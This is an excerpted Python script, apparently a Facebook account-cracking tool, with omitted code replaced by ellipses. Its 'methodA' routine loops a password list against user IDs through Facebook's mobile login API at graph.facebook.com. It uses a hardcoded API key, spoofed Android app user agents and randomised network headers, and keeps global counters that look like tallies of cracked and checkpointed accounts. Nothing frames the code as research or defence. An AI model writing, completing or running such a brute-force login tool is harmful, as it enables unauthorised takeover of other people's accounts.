...
def menu():   
    ...
    if select =='1':
        ...
        os.system('xdg-open https://www.facebook.com/urfleurheinich');menu()
    elif select =='3':
...
#__________________[ FILE METHOD M1 ]__________________#           
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            lo  = "[Dalvik/2.1.0 (Linux; U; Android 8; vivo Build/OPR1.548907.015) [FBAN/FB4A;FBAV/143.0.0.58.51;FBBV/676802649;FBRV/0;FBPN/com.facebook.katana;FBLC/ko_KR;FBMF/Samsung;FBBD/Samsung;FBDV/vivo;FBSV/8;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; vivo Build/SP2A.920910.039) [FBAN/MobileAdsManagerAndroid;FBAV/144.0.0.79.98;FBBV/293038588;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/vi_VN;FBMF/Samsung;FBBD/Samsung;FBDV/vivo;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
